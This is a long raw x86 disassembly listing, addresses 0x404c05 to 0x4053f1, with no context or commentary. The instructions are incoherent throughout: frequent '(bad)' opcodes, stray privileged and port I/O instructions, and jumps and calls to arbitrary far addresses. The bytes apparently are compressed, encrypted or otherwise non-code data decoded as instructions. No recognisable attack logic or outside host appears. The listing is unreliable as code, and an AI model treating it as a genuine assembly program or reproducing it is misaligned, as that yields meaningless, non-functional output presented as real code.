  404c05:	fcomp  DWORD PTR [edi-0x4d]
  404c08:	cwde   
  404c09:	jnp    0x404c16
  404c0b:	outs   dx,BYTE PTR ds:[esi]
  404c0c:	out    dx,eax
  404c0d:	push   0xe7ec520a
  404c12:	scas   eax,DWORD PTR es:[edi]
  404c13:	push   0x7c4046bf
  404c18:	aaa    
  404c19:	mov    eax,ds:0xb3b49fa6
  404c1e:	pop    ds
  404c1f:	scas   eax,DWORD PTR es:[edi]
  404c20:	jp     0x404be7
  404c22:	ds dec esp
  404c24:	les    ebp,FWORD PTR [ecx+0x65]
  404c27:	add    al,0xdb
  404c29:	(bad)  
  404c2a:	ins    DWORD PTR es:[edi],dx
  404c2b:	popa   
  404c2c:	adc    DWORD PTR [ecx],ebp
  404c2e:	push   es
  404c2f:	jmp    0x5763ebcd
  404c34:	push   es
  404c35:	cmp    DWORD PTR [esi+0x34de43e7],ebx
  404c3b:	jecxz  0x404bc8
  404c3d:	jb     0x404c01
  404c3f:	(bad)  
  404c40:	or     al,0xb9
  404c42:	mov    bl,0x31
  404c44:	xchg   DWORD PTR [ebx-0x56c67efe],ebp
  404c4a:	mov    edi,0x3facba77
  404c4f:	or     al,0xa8
  404c51:	adc    al,0x63
  404c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c54:	es loopne 0x404be7
  404c57:	jnp    0x404cb0
  404c59:	push   cs
  404c5a:	clc    
  404c5b:	ficomp WORD PTR [esi+ebx*4-0x25]
  404c5f:	mov    esp,0xeb3227e3
  404c64:	aas    
  404c65:	xchg   BYTE PTR [eax],al
  404c67:	push   ebx
  404c68:	cmp    eax,0xc940260d
  404c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c6e:	cmp    al,0x1d
  404c70:	je     0x404c79
  404c72:	dec    ebp
  404c73:	aam    0xca
  404c75:	jno    0x404c1b
  404c77:	mov    ds:0xb5f5fd89,eax
  404c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c7d:	call   0xafae6293
  404c82:	fisub  WORD PTR [esi+0x489851bd]
  404c88:	bound  edi,QWORD PTR [edi-0x2341b6d9]
  404c8e:	push   cs
  404c8f:	xchg   esp,eax
  404c90:	dec    ebp
  404c91:	inc    ebp
  404c92:	add    DWORD PTR [ebx-0x32],ebx
  404c95:	mov    eax,0x829692dd
  404c9a:	and    ecx,ecx
  404c9c:	mov    ds:0xc01a7485,al
  404ca1:	inc    esp
  404ca2:	fmul   QWORD PTR [ebp-0x346be954]
  404ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca9:	dec    esi
  404caa:	pop    eax
  404cab:	ss xchg ebx,eax
  404cad:	(bad)
  404cb0:	cmc    
  404cb1:	xor    ebp,DWORD PTR [esi-0x2e277fb7]
  404cb7:	lea    edx,[edx-0x21]
  404cba:	lods   eax,DWORD PTR ds:[esi]
  404cbb:	in     eax,0x67
  404cbd:	pop    edx
  404cbe:	sbb    BYTE PTR [eax+0x2ce68e6e],bh
  404cc4:	adc    al,0x19
  404cc6:	sbb    al,0x5e
  404cc9:	ins    BYTE PTR es:[edi],dx
  404cca:	and    DWORD PTR [ebp+0x7a510ce7],0x840b8535
  404cd4:	(bad)  
  404cd5:	fadd   QWORD PTR [ebp-0x75]
  404cd8:	cmp    eax,0x9635b98
  404cdd:	mov    ebp,0xa6c943f8
  404ce2:	push   0x47d7a7a4
  404ce7:	push   ds
  404ce8:	mov    edi,DWORD PTR [esi-0x2d]
  404ceb:	push   esp
  404cec:	dec    ebp
  404ced:	push   edx
  404cee:	popf   
  404cef:	jle    0x404d56
  404cf1:	cmp    DWORD PTR [esi-0x2c74544c],edi
  404cf7:	(bad)  
  404cf8:	pop    esi
  404cf9:	popa   
  404cfa:	pop    ds
  404cfb:	leave  
  404cfc:	stos   DWORD PTR es:[edi],eax
  404cfd:	outs   dx,BYTE PTR ds:[esi]
  404cfe:	jne    0x404cdc
  404d00:	ja     0x404d81
  404d02:	cmp    al,0x63
  404d04:	and    DWORD PTR [eax+edx*1-0x46ddde97],ebp
  404d0b:	in     al,dx
  404d0c:	aad    0xfe
  404d0e:	inc    ebx
  404d0f:	int3   
  404d10:	jbe    0x404d08
  404d12:	stos   BYTE PTR es:[edi],al
  404d13:	inc    esi
  404d14:	push   0xe4e9812d
  404d19:	xchg   esi,eax
  404d1a:	xor    bh,BYTE PTR [ecx+ebx*4+0x29e72796]
  404d21:	pop    ds
  404d22:	jg     0x404d5f
  404d24:	push   cs
  404d25:	dec    ebx
  404d26:	cld    
  404d27:	test   DWORD PTR [eax-0x135aeb31],eax
  404d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d2e:	imul   esi,DWORD PTR [edi+0x619fb8b3],0xffffffb8
  404d35:	bound  ecx,QWORD PTR [edx+0x5]
  404d38:	das    
  404d39:	mov    ds:0x7ede89d1,eax
  404d3e:	repnz pop esp
  404d40:	out    0x33,eax
  404d42:	and    eax,0x380cd4a1
  404d47:	pop    esp
  404d48:	mov    WORD PTR [eax+0x7f],si
  404d4c:	fmul   st(7),st
  404d4e:	inc    edi
  404d4f:	xor    eax,0x27b8aebb
  404d54:	sub    edx,DWORD PTR [edx+edi*1-0x6f2dfc0a]
  404d5b:	xor    eax,0xbc03d5e5
  404d60:	ins    DWORD PTR es:[edi],dx
  404d61:	(bad)  
  404d62:	fidivr DWORD PTR [esi+0x356ed73f]
  404d68:	xor    al,0x39
  404d6a:	push   ebx
  404d6b:	std    
  404d6c:	sbb    DWORD PTR [esi-0x49e1a670],ebx
  404d72:	stos   DWORD PTR es:[edi],eax
  404d73:	retf   
  404d74:	or     eax,0x991f2b6
  404d79:	call   0x5185:0xa601a57f
  404d80:	add    al,0x1f
  404d82:	cwde   
  404d83:	addr16 push ebp
  404d85:	or     ecx,DWORD PTR [edi-0xedc406f]
  404d8b:	mov    esp,0x59a9c4f0
  404d90:	xchg   edx,eax
  404d91:	repz add bh,BYTE PTR [edi-0x6a]
  404d95:	shl    dh,1
  404d97:	adc    BYTE PTR [edi+0x5bf68dc3],al
  404d9d:	hlt    
  404d9e:	fs adc al,0x61
  404da1:	mov    ds:0x40bad459,eax
  404da6:	push   ecx
  404da7:	sub    eax,DWORD PTR [eax-0x4e]
  404daa:	xchg   ebp,eax
  404dac:	dec    ebx
  404dad:	enter  0xcb5f,0x25
  404db1:	(bad)  
  404db2:	push   edi
  404db3:	aas    
  404db4:	push   ebx
  404db5:	popa   
  404db6:	jno    0x404d85
  404db8:	dec    esi
  404db9:	shl    bh,0x8c
  404dbc:	(bad)  
  404dbd:	inc    edi
  404dbe:	(bad)  
  404dbf:	fistp  QWORD PTR [ebx+0x486043d0]
  404dc5:	scas   al,BYTE PTR es:[edi]
  404dc6:	addr16 adc ch,dl
  404dc9:	pop    ss
  404dca:	addr16 dec ebx
  404dcc:	pop    ebx
  404dcd:	push   ss
  404dce:	and    BYTE PTR [esi],dl
  404dd0:	mov    dl,bh
  404dd2:	sub    BYTE PTR [ebx-0x6a],bl
  404dd5:	mov    ah,0xf5
  404dd7:	sbb    eax,0xb44e8a82
  404ddc:	mov    ds:0x76cd12b2,al
  404de1:	mov    ecx,0xac809a32
  404de6:	ja     0x404df7
  404de8:	sub    al,0xea
  404dea:	pusha  
  404deb:	inc    edx
  404dec:	mov    bh,BYTE PTR [eax+0x4c]
  404def:	push   ecx
  404df0:	out    0x3d,eax
  404df2:	imul   esp,esi,0x5f83a301
  404df8:	xor    BYTE PTR [esi],dh
  404dfa:	push   esi
  404dfb:	push   edx
  404dfc:	xchg   ebx,eax
  404dfd:	loopne 0x404e35
  404dff:	xor    al,0xdd
  404e01:	jmp    0x404e0c
  404e03:	inc    edi
  404e04:	xchg   ecx,eax
  404e05:	mov    eax,ds:0x35245291
  404e0a:	mov    edi,0xac5d4a7a
  404e0f:	adc    bl,dl
  404e11:	push   ecx
  404e12:	ret    
  404e13:	popf   
  404e14:	mov    bl,0x68
  404e16:	xchg   edx,esi
  404e18:	sub    BYTE PTR [esi],al
  404e1a:	inc    eax
  404e1b:	xchg   esp,eax
  404e1c:	outs   dx,BYTE PTR ds:[esi]
  404e1d:	mov    ebx,DWORD PTR [esi]
  404e1f:	add    eax,0xb3311209
  404e24:	sbb    DWORD PTR [ecx-0x24],eax
  404e27:	sbb    cl,ch
  404e29:	mov    gs,WORD PTR [ebp-0x64]
  404e2c:	push   ss
  404e2d:	jecxz  0x404eaa
  404e2f:	retf   0x17ea
  404e32:	fisub  WORD PTR [eax+0x37e7bfd3]
  404e38:	or     ch,bh
  404e3a:	repnz loope 0x404e58
  404e3d:	dec    ebp
  404e3e:	xchg   DWORD PTR [ecx-0xe7680c8],eax
  404e44:	cmp    eax,0x1ef59497
  404e49:	sbb    DWORD PTR ss:[ecx-0x1c37c990],eax
  404e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e51:	aad    0xdc
  404e53:	mov    cl,0x91
  404e55:	add    al,0x35
  404e57:	jp     0x404e47
  404e59:	mov    esp,0xe455e631
  404e5e:	mov    ebp,0xe78fb22e
  404e63:	sbb    al,0x1e
  404e65:	ret    
  404e66:	shr    BYTE PTR [ecx+edx*4],1
  404e69:	iret   
  404e6a:	and    eax,0x20f969fe
  404e6f:	and    cl,dl
  404e71:	jns    0x404e67
  404e73:	push   edi
  404e74:	loop   0x404e55
  404e76:	ss jno 0x404ed9
  404e79:	or     esp,DWORD PTR [ebx-0x54]
  404e7c:	gs pop esi
  404e7e:	xchg   esp,eax
  404e7f:	push   esi
  404e80:	(bad)  
  404e81:	stc    
  404e82:	dec    ebx
  404e83:	adc    DWORD PTR [edi+0x545a291b],edx
  404e89:	xor    ebx,0x9f635d7
  404e8f:	cli    
  404e90:	outs   dx,BYTE PTR ds:[esi]
  404e91:	sahf   
  404e92:	inc    edi
  404e93:	fs mov edi,0xd900f6c2
  404e99:	pop    esi
  404e9a:	cli    
  404e9b:	jb     0x404ef1
  404e9d:	int    0xc
  404e9f:	mov    bl,0xb6
  404ea1:	xchg   edx,eax
  404ea2:	push   edi
  404ea3:	pop    edx
  404ea4:	or     ecx,DWORD PTR ds:0x5d4718be
  404eaa:	loopne 0x404ed7
  404eac:	xor    edi,ebp
  404eae:	cmp    al,0x7
  404eb0:	shl    ebp,1
  404eb2:	sbb    DWORD PTR [ebx],edi
  404eb4:	mov    DWORD PTR ds:0x7923ceec,edi
  404eba:	ins    BYTE PTR es:[edi],dx
  404ebb:	mov    ebp,DWORD PTR [edx+0x5c4aad87]
  404ec1:	mov    bl,BYTE PTR [edi+eax*2+0x62]
  404ec5:	pop    edx
  404ec6:	cs inc ebx
  404ec8:	mov    ds:0x4c50d6c3,al
  404ecd:	cs in  al,dx
  404ecf:	shr    BYTE PTR [edi-0x12],1
  404ed2:	jbe    0x404f36
  404ed4:	retf   0xdaf1
  404ed7:	test   eax,0x32a2b025
  404edc:	jae    0x404f2b
  404ede:	xchg   edi,eax
  404edf:	outs   dx,DWORD PTR ds:[esi]
  404ee0:	push   esi
  404ee1:	cmp    edi,ebx
  404ee3:	fstp   st(5)
  404ee5:	add    al,BYTE PTR [edi-0x497694d9]
  404eeb:	xor    al,0x67
  404eed:	jmp    DWORD PTR ds:0xd787b2b9
  404ef3:	push   eax
  404ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef5:	js     0x404eea
  404ef7:	xor    eax,0x412d0b15
  404efc:	xchg   DWORD PTR [eax],edx
  404efe:	mov    ebp,0x7c8f7dab
  404f03:	fldcw  WORD PTR [eax]
  404f05:	and    BYTE PTR [ebx-0x21bde4a2],dl
  404f0b:	dec    ebx
  404f0c:	ins    BYTE PTR es:[edi],dx
  404f0d:	mov    ebx,DWORD PTR [ecx-0x1e49dc69]
  404f13:	fldcw  WORD PTR [edx-0x26]
  404f16:	sub    dh,bl
  404f18:	dec    ebx
  404f19:	(bad)  
  404f1a:	in     al,dx
  404f1b:	pop    ebp
  404f1c:	smsw   WORD PTR [ebx-0x7abe20a]
  404f23:	dec    esi
  404f24:	fwait
  404f25:	jmp    DWORD PTR ds:0xc18752f0
  404f2b:	and    al,0x94
  404f2d:	push   0x3a
  404f2f:	inc    eax
  404f30:	dec    esp
  404f31:	adc    al,0xa
  404f33:	scas   eax,DWORD PTR es:[edi]
  404f34:	or     BYTE PTR [edi-0x4c],ah
  404f37:	cs xchg ecx,eax
  404f39:	push   ecx
  404f3a:	fnstsw WORD PTR [ecx+0x639be90d]
  404f40:	repnz cmc 
  404f42:	adc    ebp,DWORD PTR [ecx+0x2927840e]
  404f48:	test   DWORD PTR [ebx-0x46],edx
  404f4b:	sar    DWORD PTR [ebx],cl
  404f4d:	inc    edx
  404f4f:	inc    ebp
  404f50:	ds out 0x77,al
  404f53:	mov    esi,0x248e6dde
  404f58:	pop    edi
  404f59:	loop   0x404f52
  404f5b:	cmp    ax,0x3db1
  404f5f:	aad    0x51
  404f61:	pop    esi
  404f62:	dec    ebp
  404f63:	inc    edx
  404f64:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  404f66:	shl    dl,0x4f
  404f69:	jmp    DWORD PTR [ecx]
  404f6b:	jmp    0xb11f:0x6dcf2c16
  404f72:	xor    dl,BYTE PTR [ebp-0x6b]
  404f75:	mov    cl,0x7c
  404f77:	sar    cl,0x6c
  404f7a:	adc    BYTE PTR [edx-0x5f1ea747],0xa3
  404f81:	shr    DWORD PTR [eax],1
  404f83:	stc    
  404f84:	popf   
  404f85:	leave  
  404f86:	(bad)  
  404f87:	mov    al,ds:0xa1b4047d
  404f8c:	sbb    al,0x4c
  404f8e:	push   0xdc9ec35c
  404f93:	test   BYTE PTR [ebp+0x241287fc],0x1
  404f9a:	push   ebp
  404f9b:	ret    
  404f9c:	leave  
  404f9d:	ja     0x404f4a
  404f9f:	stos   BYTE PTR es:[edi],al
  404fa0:	addr16 push ss
  404fa2:	adc    ebp,ecx
  404fa4:	cli    
  404fa5:	pop    ebx
  404fa6:	mov    edx,0x83893b84
  404fab:	int    0xc5
  404fad:	shr    BYTE PTR [eax+edi*4+0x354b5c29],0xca
  404fb5:	into   
  404fb6:	xchg   DWORD PTR ss:[esi],esi
  404fb9:	xchg   esi,eax
  404fba:	pop    esp
  404fbb:	pop    ecx
  404fbc:	xor    DWORD PTR [edi],edi
  404fbe:	sub    DWORD PTR [ecx],ebp
  404fc0:	out    0xc5,al
  404fc2:	mov    ds:0x857cc885,al
  404fc7:	arpl   WORD PTR ds:0xf036b1d3,cx
  404fcd:	pop    es
  404fce:	enter  0x1eab,0x95
  404fd2:	add    eax,DWORD PTR [eax-0x71]
  404fd5:	xchg   edi,eax
  404fd6:	push   ebx
  404fd7:	ss pop ebx
  404fd9:	jmp    0xa4c5211f
  404fde:	lods   al,BYTE PTR ds:[esi]
  404fdf:	lea    edx,[ecx+0x27]
  404fe2:	cmp    al,0x1f
  404fe4:	xor    cl,BYTE PTR [ebp+0x5e0449ab]
  404fea:	xchg   ecx,eax
  404feb:	jo     0x404fe1
  404fed:	outs   dx,DWORD PTR ds:[esi]
  404fee:	xchg   ebx,eax
  404fef:	(bad)
  404ff3:	dec    edx
  404ff4:	mov    bh,0x64
  404ff6:	icebp  
  404ff7:	and    DWORD PTR [edi],edx
  404ff9:	loop   0x40505e
  404ffb:	enter  0xae3c,0xd2
  404fff:	inc    eax
  405000:	mov    ebp,0x9f1d952a
  405005:	push   ebx
  405006:	test   BYTE PTR [ebp+0xadcf27b],ch
  40500c:	ss push ebp
  40500e:	imul   esp,DWORD PTR [ecx+0x5d35ce4f],0x18
  405015:	mov    ebp,0xd210b6f5
  40501a:	gs imul edx
  40501d:	mov    eax,ds:0xd6ebb7f7
  405022:	inc    esp
  405023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405024:	push   esi
  405025:	loop   0x405063
  405027:	pop    eax
  405028:	inc    ebp
  405029:	mov    eax,0x150cbe27
  40502e:	and    DWORD PTR [edi+ebp*8-0x134e08ca],ebx
  405035:	je     0x405004
  405037:	scas   eax,DWORD PTR es:[edi]
  405038:	aam    0x88
  40503a:	jbe    0x404ff0
  40503c:	xchg   esp,eax
  40503d:	pop    ss
  40503e:	hlt    
  40503f:	fldln2 
  405041:	cmp    eax,0x2261280b
  405046:	fadd   st,st(4)
  405048:	add    bl,BYTE PTR [esi+0x784db9ed]
  40504e:	sub    ebp,DWORD PTR [eax+0x58]
  405051:	int    0xa5
  405053:	jo     0x405009
  405055:	mov    al,0x7d
  405057:	inc    eax
  405058:	mov    ah,0xa4
  40505a:	cmc    
  40505b:	scas   al,BYTE PTR es:[edi]
  40505c:	iret   
  40505d:	xlat   BYTE PTR ds:[ebx]
  40505e:	sub    BYTE PTR [esi+0x4b],al
  405061:	adc    DWORD PTR [esi],esp
  405063:	sbb    eax,0x93ee35f1
  405068:	sub    eax,0x41012e78
  40506d:	arpl   WORD PTR [ebp+0x49f4e0fa],dx
  405073:	arpl   di,bx
  405075:	stos   DWORD PTR es:[edi],eax
  405076:	aam    0xd0
  405078:	(bad)  
  405079:	ss push cs
  40507b:	and    BYTE PTR [edx+0x68],bl
  40507e:	ror    DWORD PTR [esi-0x104d61c7],1
  405084:	sahf   
  405085:	mov    DWORD PTR [ebp+0x546dc25f],esi
  40508b:	js     0x4050ea
  40508d:	mov    esi,0x275cbdcc
  405092:	sbb    DWORD PTR [ecx],edi
  405094:	std    
  405095:	scas   eax,DWORD PTR es:[edi]
  405096:	loopne 0x405080
  405098:	mov    esp,0x67d2f581
  40509d:	enter  0xa0d4,0x3d
  4050a1:	cmp    dl,0xa2
  4050a4:	and    dl,BYTE PTR [ecx+0x30]
  4050a7:	sbb    al,0xb4
  4050a9:	les    edx,FWORD PTR [eax+0x2c68a336]
  4050af:	jecxz  0x405113
  4050b1:	in     eax,0x74
  4050b3:	fwait
  4050b4:	lahf   
  4050b5:	ret    0x674d
  4050b8:	inc    ebx
  4050b9:	or     al,0x49
  4050bb:	(bad)  
  4050bc:	rcr    dl,cl
  4050be:	shl    DWORD PTR [ebp-0x4245d583],0xdb
  4050c5:	adc    eax,0x8ac0c5b2
  4050ca:	lea    ecx,[esi+0x5e]
  4050cd:	xchg   ecx,eax
  4050ce:	pop    ss
  4050cf:	push   ss
  4050d0:	mov    dl,0x7
  4050d2:	stos   BYTE PTR es:[edi],al
  4050d3:	dec    eax
  4050d4:	test   eax,0x667b451f
  4050d9:	dec    ebx
  4050da:	jmp    0xf530:0xabb14ebc
  4050e1:	je     0x4050b9
  4050e3:	div    ebp
  4050e5:	cld    
  4050e6:	sbb    BYTE PTR [edx-0x2d5ae6b6],bl
  4050ec:	jno    0x405162
  4050ee:	sar    BYTE PTR [ecx],1
  4050f0:	call   0xebb68c59
  4050f5:	es fsubrp st(4),st
  4050f8:	pop    edx
  4050f9:	and    al,0xda
  4050fb:	int    0x87
  4050fd:	xchg   esi,eax
  4050fe:	fadd   DWORD PTR [edx]
  405100:	mov    ch,BYTE PTR [ebx+0x624ad854]
  405106:	jns    0x40509c
  405108:	sub    DWORD PTR [edx-0x3283cea7],0xfbe31330
  405112:	pop    DWORD PTR [ebx+0x31]
  405115:	xchg   esi,eax
  405116:	pop    ds
  405117:	cdq    
  405118:	jmp    0x84264c83
  40511d:	dec    ecx
  40511e:	or     BYTE PTR [ebx+0x3c],bl
  405121:	pop    eax
  405122:	jmp    FWORD PTR [ecx+0xa1eacda]
  405128:	loope  0x405131
  40512a:	mov    ecx,0x1c5f4b4c
  40512f:	xlat   BYTE PTR ds:[ebx]
  405130:	pop    ds
  405131:	xor    DWORD PTR [edx+0x204f9bcd],edi
  405137:	mov    esp,0x7ee9e977
  40513c:	sti    
  40513d:	or     edx,DWORD PTR [ecx-0x21]
  405140:	call   0xaff26d9f
  405145:	jle    0x4051a9
  405147:	mov    dl,0x49
  405149:	iret   
  40514a:	and    edx,DWORD PTR [ebp+0x78]
  40514d:	adc    eax,0xc4358eac
  405152:	repnz popa 
  405154:	in     al,dx
  405155:	mov    ecx,0xe5e6f406
  40515a:	sahf   
  40515b:	mov    eax,0xbaa1ed75
  405160:	mov    BYTE PTR [eax+eiz*4],ch
  405163:	rol    BYTE PTR [edi],1
  405165:	adc    esp,DWORD PTR [edx-0x6e]
  405168:	test   dl,bl
  40516a:	cmp    eax,0x993b78cd
  40516f:	leave  
  405170:	pop    ebp
  405171:	mov    esp,0xc0c763c
  405176:	mov    ds:0xfe7cb8d9,al
  40517b:	stos   DWORD PTR es:[edi],eax
  40517c:	gs xchg esp,eax
  40517e:	shl    BYTE PTR [ebp+0x7474db7f],cl
  405184:	into   
  405185:	sti    
  405186:	mov    edx,ebp
  405188:	jo     0x405192
  40518a:	stos   BYTE PTR es:[edi],al
  40518b:	sar    DWORD PTR [esi-0x39],0x1e
  40518f:	inc    ecx
  405190:	add    DWORD PTR [esi],ebp
  405192:	xchg   esi,eax
  405193:	lea    esi,[eax+0x71954ef4]
  405199:	call   0x7b8bbcb8
  40519e:	dec    esi
  40519f:	in     eax,dx
  4051a0:	call   0xcf8b8823
  4051a5:	mov    ds:0x4ae369bd,eax
  4051aa:	fild   DWORD PTR ds:0x8e1864cd
  4051b0:	and    BYTE PTR [ecx-0x1e],al
  4051b3:	adc    BYTE PTR [edx+0x60],al
  4051b6:	repz mov ah,BYTE PTR [ecx-0x6d]
  4051ba:	push   edi
  4051bb:	push   es
  4051bc:	push   cs
  4051bd:	loope  0x40515d
  4051bf:	pusha  
  4051c0:	jbe    0x40516c
  4051c2:	mov    ah,0x85
  4051c4:	loope  0x405163
  4051c6:	in     al,0xa3
  4051c8:	nop
  4051c9:	push   es
  4051ca:	mov    edi,0x28486ae1
  4051cf:	add    al,0x57
  4051d1:	nop
  4051d2:	inc    esp
  4051d3:	iret   
  4051d4:	jp     0x40524b
  4051d6:	pop    eax
  4051d7:	jns    0x405199
  4051d9:	jbe    0x4051a6
  4051db:	push   0xba4c50ef
  4051e0:	dec    ecx
  4051e1:	stos   BYTE PTR es:[edi],al
  4051e2:	dec    edx
  4051e3:	inc    ebp
  4051e4:	into   
  4051e5:	inc    ecx
  4051e6:	jg     0x405224
  4051e8:	jmp    0xfd95:0x23b49892
  4051ef:	push   edx
  4051f0:	js     0x40524e
  4051f2:	je     0x40522d
  4051f4:	mov    dl,bh
  4051f6:	in     eax,dx
  4051f7:	jmp    0x6149655a
  4051fc:	dec    ebp
  4051fd:	add    al,0x5e
  4051ff:	mov    BYTE PTR [ebx+0x1d86576d],cl
  405205:	cli    
  405206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405207:	xlat   BYTE PTR ds:[ebx]
  405208:	jbe    0x4051f3
  40520a:	cmp    eax,0xfc06c765
  40520f:	cmp    eax,esi
  405211:	mov    esp,DWORD PTR [ebp-0x2]
  405214:	ja     0x4051b7
  405216:	or     al,bh
  405218:	(bad)  
  405219:	sub    al,0x7a
  40521b:	inc    ecx
  40521c:	push   ecx
  40521e:	aad    0xbb
  405220:	stc    
  405221:	mov    ds:0xf76c4df9,al
  405226:	nop
  405227:	sbb    dh,BYTE PTR [edx]
  405229:	fdiv   st,st(0)
  40522b:	jmp    0xa46d6c99
  405230:	je     0x4051b8
  405232:	add    eax,0x3ba0feb0
  405237:	mov    ecx,?
  405239:	test   eax,0xf31438
  40523e:	loopne 0x4052a5
  405240:	dec    eax
  405241:	mov    al,0x85
  405243:	push   ecx
  405244:	jo     0x405293
  405246:	lea    esi,[esi]
  405248:	or     al,0x1a
  40524a:	xor    DWORD PTR [edx-0x2192746d],0x1d
  405251:	icebp  
  405252:	pop    ecx
  405253:	fs or  ch,ah
  405256:	sbb    al,0x55
  405258:	sbb    ebx,DWORD PTR [ecx]
  40525a:	dec    esi
  40525b:	mov    ds:0x4453033,al
  405260:	adc    al,0xd5
  405262:	rcr    DWORD PTR [edi],0x37
  405265:	aam    0x58
  405267:	sbb    esi,edx
  405269:	aaa    
  40526a:	fcomi  st,st(3)
  40526c:	dec    edx
  40526d:	push   ds
  40526e:	out    dx,al
  40526f:	mov    ebp,0xe76cba79
  405274:	(bad)  
  405275:	dec    eax
  405276:	cmp    eax,0x674f8400
  40527b:	sub    BYTE PTR [ebx-0x157c0906],bl
  405281:	cmp    al,0x1f
  405283:	mov    ecx,0xf2f137f8
  405288:	scas   al,BYTE PTR es:[edi]
  405289:	inc    ebp
  40528a:	and    BYTE PTR [ebx-0x29133f16],ah
  405290:	jp     0x4052af
  405292:	out    0x12,eax
  405294:	cmp    BYTE PTR [ebx+0x5b],0x1d
  405298:	call   0xd261da99
  40529d:	fisubr WORD PTR [esp+eiz*4]
  4052a0:	inc    esi
  4052a1:	mov    WORD PTR [edx+0x41ad7e97],ds
  4052a7:	cmp    dl,bh
  4052a9:	xchg   edx,eax
  4052aa:	dec    edi
  4052ab:	dec    esi
  4052ac:	or     DWORD PTR [esi-0x7cd7b1bc],edx
  4052b2:	dec    eax
  4052b3:	mov    esi,DWORD PTR [ebx-0x61]
  4052b6:	loope  0x4052cf
  4052b8:	xchg   esi,eax
  4052b9:	jbe    0x40530e
  4052bb:	lea    edx,[esi-0x8084eed]
  4052c1:	repz out 0xf9,eax
  4052c4:	aaa    
  4052c5:	sar    BYTE PTR ds:0xc5ec4e12,1
  4052cb:	cli    
  4052cc:	aad    0x5
  4052ce:	lds    esi,FWORD PTR [ecx-0x5f]
  4052d1:	outs   dx,BYTE PTR ds:[esi]
  4052d2:	inc    esp
  4052d3:	out    dx,al
  4052d4:	sbb    DWORD PTR [eax+0x74],ebx
  4052d7:	aas    
  4052d8:	imul   ebx,esp,0x2e5a0cc4
  4052de:	(bad)  
  4052df:	pop    ecx
  4052e0:	and    al,0xbb
  4052e2:	jne    0x405292
  4052e4:	mov    al,ds:0x196c8c59
  4052e9:	(bad)  
  4052ea:	adc    BYTE PTR [ebp+0x67],bh
  4052ed:	mov    ds:0xdfa790f0,eax
  4052f2:	scas   al,BYTE PTR es:[edi]
  4052f3:	xor    edx,DWORD PTR [eax]
  4052f5:	test   BYTE PTR [ecx+0x290c66da],dl
  4052fb:	xor    al,0x9b
  4052fd:	inc    esp
  4052fe:	int    0xef
  405300:	jl     0x4052a7
  405302:	xchg   esi,esp
  405304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405305:	mov    eax,0x18eb2ce4
  40530a:	outs   dx,BYTE PTR ds:[esi]
  40530b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40530d:	adc    edx,DWORD PTR [ecx]
  40530f:	sbb    al,0x1f
  405311:	rcr    DWORD PTR [edi-0x48ce5975],1
  405317:	or     BYTE PTR [ebx+0x2a65dbe4],bl
  40531d:	(bad)  
  40531f:	cmp    dh,BYTE PTR [ebp+0x7f]
  405322:	iret   
  405323:	js     0x4052ae
  405325:	in     al,0xeb
  405327:	jg     0x7b9312db
  40532d:	or     al,0x91
  40532f:	int3   
  405330:	inc    ebx
  405331:	sub    esp,DWORD PTR [eax]
  405333:	sbb    BYTE PTR [edx-0x17a95f74],bl
  405339:	dec    ebp
  40533a:	and    ah,BYTE PTR [esi+0x2fc101eb]
  405340:	jmp    0x4053b9
  405342:	outs   dx,BYTE PTR ds:[esi]
  405343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405344:	mov    ch,0x24
  405346:	pop    ecx
  405347:	call   0x9369:0xb0fa4703
  40534e:	clc    
  40534f:	push   ebp
  405350:	jae    0x405330
  405352:	andps  xmm1,XMMWORD PTR [eax]
  405355:	sbb    bh,BYTE PTR [eax+0x7d7bded8]
  40535b:	fiadd  WORD PTR [edi+0x73990dfe]
  405361:	rdmsr  
  405363:	fldcw  WORD PTR [ebx]
  405365:	iret   
  405366:	pop    edi
  405367:	or     dh,BYTE PTR ds:0xff0fa7d
  40536d:	ins    BYTE PTR es:[edi],dx
  40536e:	into   
  40536f:	lods   al,BYTE PTR ds:[esi]
  405370:	and    eax,0x47e2bf4
  405375:	pop    ebp
  405376:	xor    al,BYTE PTR [edx+0x63]
  405379:	mov    al,ds:0x3744696e
  40537e:	int3   
  40537f:	(bad)  
  405380:	div    DWORD PTR [ebp+0x27]
  405383:	mov    WORD PTR [edx+0x15],ss
  405386:	lahf   
  405387:	aam    0xd7
  405389:	lea    esi,[edx+0x479df96b]
  40538f:	mov    ebp,0x40491e15
  405394:	loope  0x405389
  405396:	sahf   
  405397:	shl    BYTE PTR [edi-0x767a0f5],1
  40539d:	gs add eax,0xff004cbb
  4053a3:	into   
  4053a4:	mov    ds:0x4f3c9f91,eax
  4053a9:	loop   0x40537b
  4053ab:	sbb    esi,DWORD PTR [esi-0x49]
  4053ae:	inc    ebx
  4053af:	mov    edx,0x9a0266d5
  4053b4:	inc    ebx
  4053b5:	loop   0x40536d
  4053b7:	push   es
  4053b8:	outs   dx,DWORD PTR ds:[esi]
  4053b9:	pop    esi
  4053ba:	rcr    BYTE PTR [ebp-0x5ec5141c],cl
  4053c0:	jge    0x4053ec
  4053c2:	xchg   BYTE PTR [ecx],cl
  4053c4:	test   DWORD PTR [esi],edi
  4053c6:	and    eax,0xb0f4a3f6
  4053cb:	je     0x405376
  4053cd:	mov    dh,0xce
  4053cf:	pop    esp
  4053d0:	and    ebx,DWORD PTR ds:0x6060ad2c
  4053d6:	jnp    0x40538e
  4053d8:	mov    ebx,0xe15f9280
  4053dd:	cmp    al,0x31
  4053df:	push   ebx
  4053e0:	push   esi
  4053e1:	sub    BYTE PTR [edx],cl
  4053e3:	(bad)  
  4053e4:	adc    eax,0xeb63fec
  4053e9:	enter  0x9896,0x43
  4053ed:	adc    BYTE PTR [ebp-0x30],al
  4053f0:	xchg   esp,eax
  4053f1:	push   cs
